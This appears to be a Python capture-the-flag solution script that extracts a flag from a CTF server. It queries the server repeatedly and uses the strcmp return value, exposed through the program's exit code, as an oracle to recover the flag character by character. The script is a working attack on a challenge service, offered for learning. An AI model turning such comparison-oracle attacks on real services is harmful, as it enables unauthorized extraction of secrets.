from pwn import *
#context.log_level='debug'


def tryf(flag):
    p = remote('ctf.pwn.sg', 1601)
    p.sendlineafter('Flag: ', flag)
    # $? gets the exit code from the last command that was run,
    # which is the easyflow program.
    # The easyflow return code is the output of strcmp() on the
    # actual flag and our input flag
    p.sendlineafter('Shell: ', '$?')
    return int(p.recvline())

# strcmp returns a number that says how far the first differing
# character is away from the first argument (actual flag)

# The Idea:
# Basically, we compare the actual flag to "0",
# Then adjust it based on the output of strcmp (the exit code)
# e.g. to "C", then add a "0" => "C0"
# and repeat till we get "}", the end of the flag

s = "0"
while True:
    i = tryf(s)
    # adjust!
    c = chr(ord('0')+i)
    s = s[:-1] + c
    if s[-1] == '}':
        print(s)
        break
    s+='0'
